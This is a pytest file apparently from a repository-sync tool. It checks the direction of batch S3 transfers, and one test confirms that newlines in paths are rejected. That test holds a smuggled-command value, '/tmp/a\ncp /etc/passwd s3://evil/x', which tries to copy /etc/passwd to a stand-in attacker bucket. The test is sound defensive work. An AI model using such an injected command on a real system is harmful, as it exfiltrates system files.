"""Batch transfer direction: uploads and downloads use the right batch call."""

from __future__ import annotations

import pytest

from reflake.core.objects.backends import TransferItem, TransferPlan
from reflake.core.objects.transfer import S5CmdBlobTransferBackend
from reflake.core.repository_sync import execute_transfer_plan


class _FakeLocalStore:
    pass


class _FakeRemoteStore:
    pass


class RecordingBatchBackend(S5CmdBlobTransferBackend):
    def __init__(self) -> None:
        super().__init__()
        self.uploads: list[tuple[str, str]] = []
        self.downloads: list[tuple[str, str]] = []
        self.runs: list[list[str]] = []

    def _run(self, args: list[str], input_data: str | None = None):  # type: ignore[override]
        self.runs.append((list(args), input_data or ""))
        lines = (input_data or "").strip().splitlines()
        for line in lines:
            parts = line.split()
            # lines look like: cp [--if-not-exists] <src> <dst>
            src, dst = parts[-2], parts[-1]
            if src.startswith("s3://"):
                self.downloads.append((src, dst))
            else:
                self.uploads.append((src, dst))

        class _Result:
            stdout = ""
            stderr = ""
            returncode = 0

        return _Result()


def _plan(direction: str) -> TransferPlan:
    return TransferPlan(
        direction=direction,  # type: ignore[arg-type]
        items=(
            TransferItem(
                kind="blob",
                object_id="a" * 64,
                local_path="/tmp/a",
                remote_uri="s3://b/blobs/a",
            ),
            TransferItem(
                kind="tree",
                object_id="t" * 64,
                local_path="/tmp/t",
                remote_uri="s3://b/trees/t",
            ),
        ),
    )


def test_batch_upload_uses_upload_order() -> None:
    backend = RecordingBatchBackend()
    n = execute_transfer_plan(
        _plan("upload"),
        local_store=_FakeLocalStore(),  # type: ignore[arg-type]
        remote_store=_FakeRemoteStore(),  # type: ignore[arg-type]
        batch_backend=backend,  # type: ignore[arg-type]
    )
    assert n == 2
    assert backend.uploads == [
        ("/tmp/a", "s3://b/blobs/a"),
        ("/tmp/t", "s3://b/trees/t"),
    ]
    assert backend.downloads == []


def test_batch_download_uses_download_order() -> None:
    backend = RecordingBatchBackend()
    n = execute_transfer_plan(
        _plan("download"),
        local_store=_FakeLocalStore(),  # type: ignore[arg-type]
        remote_store=_FakeRemoteStore(),  # type: ignore[arg-type]
        batch_backend=backend,  # type: ignore[arg-type]
    )
    assert n == 2
    assert backend.downloads == [
        ("s3://b/blobs/a", "/tmp/a"),
        ("s3://b/trees/t", "/tmp/t"),
    ]
    assert backend.uploads == []


def test_batch_rejects_newlines_in_paths() -> None:
    backend = S5CmdBlobTransferBackend()
    plan = TransferPlan(
        direction="upload",
        items=(
            TransferItem(
                kind="blob",
                object_id="a" * 64,
                local_path="/tmp/a\ncp /etc/passwd s3://evil/x",
                remote_uri="s3://b/blobs/a",
            ),
        ),
    )
    with pytest.raises(ValueError, match="newline"):
        backend.transfer(plan)


def test_plan_rejects_unknown_direction() -> None:
    with pytest.raises(ValueError, match="direction"):
        TransferPlan(direction="sideways", items=())  # type: ignore[arg-type]
